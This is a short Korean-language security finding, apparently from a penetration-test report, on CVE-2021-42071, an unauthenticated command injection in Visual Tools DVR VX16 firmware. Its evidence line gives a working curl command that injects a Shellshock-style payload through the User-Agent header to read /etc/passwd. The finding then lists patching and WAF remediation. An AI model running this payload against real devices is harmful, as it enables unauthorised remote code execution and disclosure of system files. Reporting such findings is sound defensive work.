## Visual Tools DVR VX16 4.2.28.0 - Unauthenticated OS Command Injection
- **End-Point**: `http://10.64.162.78/cgi-bin/test.cgi/cgi-bin/slogin/login.py`
- **영향**: 인증되지 않은 원격 코드 실행(RCE)을 통해 대상 시스템의 기밀성, 무결성, 가용성을 완전히 침해할 수 있음.
- **설명**: Visual Tools DVR VX16 4.2.28.0 버전에서 발생하는 취약점으로, 인증되지 않은 원격 공격자가 특수하게 조작된 HTTP 헤더를 전송하여 대상 장치에서 임의의 OS 명령을 실행할 수 있음.
- **근거**: `User-Agent` 헤더에 쉘 명령어를 삽입하여 `/etc/passwd` 파일을 읽어오는 `curl -X 'GET' -d '' -H 'Accept: */*' -H 'Host: 10.64.162.78' -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' 'http://10.64.162.78/cgi-bin/test.cgi/cgi-bin/slogin/login.py'` 명령을 통해 재현됨.
- **대응**: 해당 취약점(CVE-2021-42071)이 해결된 최신 펌웨어로 업데이트를 수행하고 외부 인터넷으로부터의 접근을 제한함.
- **조치**: 제조사 패치를 적용하고, 웹 애플리케이션 방화벽(WAF)에서 비정상적인 `User-Agent` 패턴을 사용하는 요청을 탐지 및 차단하도록 설정함.
